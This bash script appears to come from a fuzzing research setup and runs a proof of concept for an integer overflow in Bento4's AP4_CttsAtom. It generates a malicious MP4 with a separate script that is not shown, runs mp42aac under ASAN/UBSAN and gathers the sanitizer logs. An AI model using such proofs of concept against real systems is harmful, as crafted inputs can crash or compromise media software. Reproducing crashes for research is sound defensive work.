#!/usr/bin/env bash
# vuln_001_run.sh - PoC runner for Bento4 AP4_CttsAtom integer overflow (VULN 001)

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4ContainerAtom_h"
MP4_FILE="${POC_DIR}/vuln_001.mp4"
RESULT_FILE="${POC_DIR}/vuln_001_result.txt"
ASAN_LOG_BASE="${POC_DIR}/asan.log"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"

# Clean up previous runs
rm -f "${RESULT_FILE}" "${POC_DIR}"/asan.log.*

echo "=== Bento4 AP4_CttsAtom Integer Overflow PoC (VULN 001) ===" | tee "${RESULT_FILE}"
echo "Date: $(date)" | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"

# Step 1: Generate the malicious MP4
echo "[*] Generating malicious MP4..." | tee -a "${RESULT_FILE}"
python3 "${POC_DIR}/vuln_001_gen.py" 2>&1 | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"

if [ ! -f "${MP4_FILE}" ]; then
    echo "[!] ERROR: MP4 file was not created" | tee -a "${RESULT_FILE}"
    exit 1
fi

# Step 2: Run mp42aac with ASAN enabled
echo "[*] Running mp42aac with ASAN/UBSAN..." | tee -a "${RESULT_FILE}"
echo "[*] Binary: ${BINARY}" | tee -a "${RESULT_FILE}"
echo "[*] Input:  ${MP4_FILE}" | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"

ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_BASE}" \
    "${BINARY}" "${MP4_FILE}" /dev/null \
    >> "${RESULT_FILE}" 2>&1 || true

echo "" | tee -a "${RESULT_FILE}"
echo "[*] Binary exited (exit code captured above via || true)" | tee -a "${RESULT_FILE}"
echo "" | tee -a "${RESULT_FILE}"

# Step 3: Check for ASAN/UBSAN output in log files
echo "=== ASAN/UBSAN Log Output ===" | tee -a "${RESULT_FILE}"
ASAN_FOUND=0

for logfile in "${POC_DIR}"/asan.log.*; do
    if [ -f "${logfile}" ]; then
        echo "[*] Found ASAN log: ${logfile}" | tee -a "${RESULT_FILE}"
        cat "${logfile}" | tee -a "${RESULT_FILE}"
        ASAN_FOUND=1
    fi
done

if [ "${ASAN_FOUND}" -eq 0 ]; then
    echo "[*] No ASAN log files found (asan.log.*)" | tee -a "${RESULT_FILE}"
fi

echo "" | tee -a "${RESULT_FILE}"
echo "=== End of ASAN/UBSAN Log ===" | tee -a "${RESULT_FILE}"
